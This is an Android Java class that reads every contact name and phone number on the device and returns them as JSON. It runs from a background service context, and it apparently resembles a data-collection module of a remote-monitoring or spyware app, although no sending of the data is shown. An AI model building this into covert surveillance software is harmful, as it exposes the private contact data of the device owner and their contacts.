package com.behavioralanalysis.service;

import android.database.Cursor;
import android.provider.ContactsContract;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class Contacts {
    public static JSONObject get() {
        JSONObject result = new JSONObject();

        try {
            JSONArray contacts = new JSONArray();

            Cursor cursor = MainService.getContext().getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] {ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
                    null,
                    null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );

            while (cursor.moveToNext()) {
                JSONObject contact = new JSONObject();
                contact.put("number", cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                contact.put("name", cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                contacts.put(contact);
            }
            result.put("contacts", contacts);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return result;
    }
}
